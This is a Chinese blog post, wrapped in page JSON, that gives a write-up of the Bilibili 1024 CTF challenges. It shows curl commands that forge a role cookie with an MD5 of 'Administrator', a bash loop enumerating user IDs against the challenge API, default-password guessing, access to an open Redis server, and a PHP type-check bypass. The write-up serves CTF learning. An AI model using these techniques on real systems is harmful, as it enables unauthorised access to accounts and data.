{"pageProps":{"title":"Bilibili 1024 节 CTF Write Up - 宝硕博客","post":{"title":"Bilibili 1024 节 CTF Write Up","date":"2020-10-26T18:02:08.000Z","updated":"2020-10-26T18:02:08.000Z","type":"post","excerpt":"","thumb":"https://s1.baoshuo.ren/2020/12/01/cZoPxLHXlkFSjrt.jpg","tags":["CTF","Bilibili"],"categories":["技术向"],"content":"<p>比赛地址： <a href=https://security.bilibili.com/sec1024/ target=_blank>https://security.bilibili.com/sec1024/</a></p>\n<h2 id=t1：页面的背后是什么？><a class=anchor href=#t1：页面的背后是什么？ target=_blank></a>T1：页面的背后是什么？</h2>\n<p><s>F12 解决一切问题</s></p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/XrLpIf2OHs4YAxJ.png alt=\"\"></p>\n<h2 id=t2：真正的秘密只有特殊的设备才能看到><a class=anchor href=#t2：真正的秘密只有特殊的设备才能看到 target=_blank></a>T2：真正的秘密只有特殊的设备才能看到</h2>\n<p>改下 UA 就行了，轻松到手</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/WPLCUHNYiE2nFwJ.png alt=\"\"></p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/83GrjFbTwJf1BHn.png alt=\"\"></p>\n<h2 id=t3：密码是啥？><a class=anchor href=#t3：密码是啥？ target=_blank></a>T3：密码是啥？</h2>\n<p>看了看源码，没啥思路，最后随便试了试 <code>admin</code> <code>root</code> <code>bilibili</code> 什么的，竟然是对的。</p>\n<ul>\n<li>用户名 <code>admin</code></li>\n<li>密码 <code>bilibili</code></li>\n</ul>\n<p>另外，你告诉我什么是 <strong>falg</strong> ？</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/eg9kBtR1aQizGYE.png alt=\"\"></p>\n<h2 id=t4：对不起，权限不足～><a class=anchor href=#t4：对不起，权限不足～ target=_blank></a>T4：对不起，权限不足～</h2>\n<p>第一次访问：</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/roVjXTfs4v8ibP5.png alt=\"\"></p>\n<p>第二次访问：</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/RpEsGn8c9KY16MH.png alt=\"\"></p>\n<p>查看源码可以发现有个 API 请求，查看请求数据得到以下信息。</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/nhF7pCTQsVYxKdj.png alt=\"\"></p>\n<p>role 里面的东西，贴进谷歌一搜就知道它是 <code>user</code> 的 MD5 。</p>\n<p>和超级管理员相关的名字相信大家都知道，无非就是 <code>admin</code> <code>Administrator</code> <code>root</code> 之类的东西。</p>\n<p>挨个试，最后发现 <code>Administrator</code> 是正确的。</p>\n<pre><code class=\"hljs language-shell\">curl &quot;http://45.113.201.36/api/ctf/4&quot; --cookie &quot;role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=***;&quot;\n</code></pre>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/gEhkmTJrnaoMwPv.png alt=\"\"></p>\n<h2 id=t5：别人的秘密><a class=anchor href=#t5：别人的秘密 target=_blank></a>T5：别人的秘密</h2>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/c4BjYs3nVuCpxmH.png alt=\"\"></p>\n<p>发现有个 API，还有个 UID。</p>\n<p>最开始没想到需要从代码里面的&quot;初始 UID&quot;开始扫，浪费了我好多时间。</p>\n<pre><code class=\"hljs language-shell\">for ((i=100336889;$i&lt;9999999999;i=($i+1))); do echo -e &quot;[$i] \\c&quot; &amp;&amp; curl &quot;http://45.113.201.36/api/ctf/5?uid=${i}&quot; -H &#x27;User-Agent: bilibili Security Browser&#x27; -H &#x27;Cookie: session=*****; role=ee11cbb19052e40b07aac0ca060c23ee&#x27; ; done\n</code></pre>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/m1Hr4u8FOJe7ycI.png alt=\"\"></p>\n<h2 id=t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～><a class=anchor href=#t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～ target=_blank></a>T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～</h2>\n<p>先扫了扫端口，发现有个 redis</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/E29tLxSiC6Qzn5O.png alt=\"\"></p>\n<pre><code class=\"hljs language-shell\">redis-cli -h 120.92.151.189 -p 6379\n</code></pre>\n<p>登上去看看，发现了第八题的 flag 。</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/Oo5vyeEsChmSt2H.png alt=\"\"></p>\n<p>然后爆破下目录</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/QEnxZsg8FpiOKwm.png alt=\"\"></p>\n<p>有个 test.php ，访问下发现是个 JSfuck 加密，丢进浏览器里面解密下</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/G7TWPndrhqBmvAI.png alt=\"\"></p>\n<p>程序员最多的地方，那就肯定是 Github 了。</p>\n<p>然后找到了一个仓库 <a href=https://github.com/interesting-1024/end target=_blank>interesting-1024/end</a></p>\n<p>有个 <code>end.php</code></p>\n<pre><code class=\"hljs language-php\"><span class=hljs-meta>&lt;?php</span>\n\n<span class=hljs-comment>//filename end.php</span>\n\n<span class=hljs-variable>$bilibili</span> = <span class=hljs-string>&quot;bilibili1024havefun&quot;</span>;\n\n<span class=hljs-variable>$str</span> = <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=hljs-variable>$_GET</span>[<span class=hljs-string>&#x27;id&#x27;</span>]);\n<span class=hljs-variable>$reg</span> = <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=hljs-string>&#x27;/\\d/is&#x27;</span>, <span class=hljs-variable>$_GET</span>[<span class=hljs-string>&#x27;id&#x27;</span>]);\n\n<span class=hljs-keyword>if</span>(!<span class=\"hljs-title function_ invoke__\">is_numeric</span>(<span class=hljs-variable>$_GET</span>[<span class=hljs-string>&#x27;id&#x27;</span>]) <span class=hljs-keyword>and</span> <span class=hljs-variable>$reg</span> !== <span class=hljs-number>1</span> <span class=hljs-keyword>and</span> <span class=hljs-variable>$str</span> === <span class=hljs-number>1</span>){\n    <span class=hljs-variable>$content</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=hljs-variable>$_GET</span>[<span class=hljs-string>&#x27;url&#x27;</span>]);\n\n    <span class=hljs-comment>//文件路径猜解</span>\n    <span class=hljs-keyword>if</span> (<span class=hljs-literal>false</span>){\n        <span class=hljs-keyword>echo</span> <span class=hljs-string>&quot;还差一点点啦～&quot;</span>;\n    }<span class=hljs-keyword>else</span>{\n        <span class=hljs-keyword>echo</span> <span class=hljs-variable>$flag</span>;\n    }\n}<span class=hljs-keyword>else</span>{\n    <span class=hljs-keyword>echo</span> <span class=hljs-string>&quot;你想要的不在这儿～&quot;</span>;\n}\n<span class=hljs-meta>?&gt;</span>\n</code></pre>\n<p>然后需要构造出一个 符合 <code>!is_numeric($_GET['id']) and preg_match('/\\d/is', $_GET['id']) !== 1 and intval($_GET['id']) === 1</code> 的请求即可。</p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/mCIevr1HSMBpkdi.png alt=\"\"></p>\n<p>可以得到一个图片的链接 <code>http://45.113.201.36/blog/imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg</code></p>\n<p><img src=https://s1.baoshuo.ren/2020/11/28/iXEgYzjPtH2NhQw.png alt=\"\"></p>\n<p>这个图片的末尾就是第十个 flag 了（图中标蓝的地方）。</p>\n","katex":false,"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#t1%EF%BC%9A%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%83%8C%E5%90%8E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F\"><span class=\"toc-text\">T1：页面的背后是什么？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#t2%EF%BC%9A%E7%9C%9F%E6%AD%A3%E7%9A%84%E7%A7%98%E5%AF%86%E5%8F%AA%E6%9C%89%E7%89%B9%E6%AE%8A%E7%9A%84%E8%AE%BE%E5%A4%87%E6%89%8D%E8%83%BD%E7%9C%8B%E5%88%B0\"><span class=\"toc-text\">T2：真正的秘密只有特殊的设备才能看到</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#t3%EF%BC%9A%E5%AF%86%E7%A0%81%E6%98%AF%E5%95%A5%EF%BC%9F\"><span class=\"toc-text\">T3：密码是啥？</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#t4%EF%BC%9A%E5%AF%B9%E4%B8%8D%E8%B5%B7%EF%BC%8C%E6%9D%83%E9%99%90%E4%B8%8D%E8%B6%B3%EF%BD%9E\"><span class=\"toc-text\">T4：对不起，权限不足～</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#t5%EF%BC%9A%E5%88%AB%E4%BA%BA%E7%9A%84%E7%A7%98%E5%AF%86\"><span class=\"toc-text\">T5：别人的秘密</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#t6-t10%EF%BC%9A%E7%BB%93%E6%9D%9F%E4%BA%A6%E6%98%AF%E5%BC%80%E5%A7%8B%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%97%85%E7%A8%8B%EF%BC%8C%E9%9C%80%E8%A6%81%E5%B0%91%E5%B9%B4%E8%87%AA%E5%B7%B1%E5%8E%BB%E6%8E%A2%E7%B4%A2%E5%95%A6%EF%BD%9E\"><span class=\"toc-text\">T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～</span></a></li></ol>","comment":true,"path":"/post/bilibili-1024-ctf-write-up/","url":"https://blog.baoshuo.ren/post/bilibili-1024-ctf-write-up/"},"__post":true},"__N_SSG":true}